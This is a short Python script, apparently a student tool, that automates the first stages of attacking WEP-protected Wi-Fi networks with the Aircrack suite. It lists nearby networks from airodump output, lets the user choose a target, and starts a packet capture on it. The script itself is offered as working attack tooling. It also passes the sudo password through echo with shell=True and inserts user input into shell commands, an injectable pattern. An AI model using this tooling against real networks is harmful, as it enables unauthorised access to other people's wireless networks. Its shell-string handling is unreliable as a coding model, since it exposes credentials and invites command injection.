# -*- coding: utf8 -*-
"""
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////

	
	WEP attack automatizer
	Programa para el ataque a una red con seguridad WEP por medio de Aircrack
	
	@author 
		jfunez2012@hotmail, jlfunez@unah.hn
	

	@version 0.1.0
	@date 2019/09/14 11:32

	@requirements: 
		aircrack suite

//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
"""
import sys
import subprocess
from subprocess import call
print('Contraseña super usuario: ')
pwd = input()
#Eliminacion de archivos pasados
cmd = 'rm MyOutput-01.csv'
call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)

print('Interfaz en modo monitor: ')
i = input()

#Ejecucion del Bash
cmd = ('./open.sh '+i)
call('echo {} | sudo -S {}'.format(pwd, cmd), shell=True)
print('Ejecutado')

#Lectura del archivo creado por airodump
Redes = []
f = open("MyOutput-01.csv", "r")
fr = f.readlines()
for x in fr:
    Redes.append(x)

#Creacion de la lista de diccionarios
claves = Redes[1].split(',')
List_dic = []
for x in range(2, len(Redes)):
    dic = dict(zip(claves, Redes[x].split(',')))
    List_dic.append(dic)

for x in range(len(List_dic)):
    print(' BSSID: ', List_dic[x].get('BSSID'), " Seguridad:", List_dic[x].get(' Privacy'), 
    " Intensidad:", List_dic[x].get(' Power'), " ESSID:", List_dic[x].get(' ESSID'))
    print()
  
print("Elija opcion [1,"+str(len(List_dic))+"]")
opcion = int(input())
opcion = opcion-1

#Eliminación de archivos pasados
cmd = 'rm automatizer-01.cap'
call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)
cmd = 'rm automatizer-01.csv'
call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)
cmd = 'rm automatizer-01.kismet.csv'
call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)
cmd = 'rm automatizer-01.kismet.netxml'
call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)


cmd = ('airodump-ng -c'+List_dic[opcion].get(' channel')+ ' -w automatizer --bssid '+List_dic[opcion].get('BSSID')+' '+i)
cmd = cmd.split()

cmd1 = subprocess.Popen(['echo', pwd], stdout=subprocess.PIPE)
cmd2 = subprocess.Popen(['sudo', '-S'] + cmd, stdin=cmd1.stdout, stdout=subprocess.PIPE)

output = cmd2.stdout.read().decode()
#call('echo {} | sudo -S {}'.format(pwd, cmd), shell=True)

